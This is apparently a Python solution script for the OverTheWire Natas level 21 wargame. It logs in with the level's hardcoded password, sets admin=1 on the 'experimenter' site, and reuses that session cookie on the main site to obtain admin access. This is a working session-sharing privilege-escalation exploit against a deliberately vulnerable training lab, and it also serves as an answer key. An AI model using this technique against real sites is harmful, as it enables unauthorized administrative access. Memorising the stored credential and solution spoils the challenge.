import requests
import re

username = "natas21"
password  = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

url1 = "http://natas21.natas.labs.overthewire.org/"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1" 

session = requests.Session()

response = session.get(url2,data={"admin":1,"submit":1},auth=(username,password))

print(response.text)
old_session = session.cookies["PHPSESSID"]

response = session.get(url1,auth=(username,password),cookies={"PHPSESSID":old_session})
print(response.text)
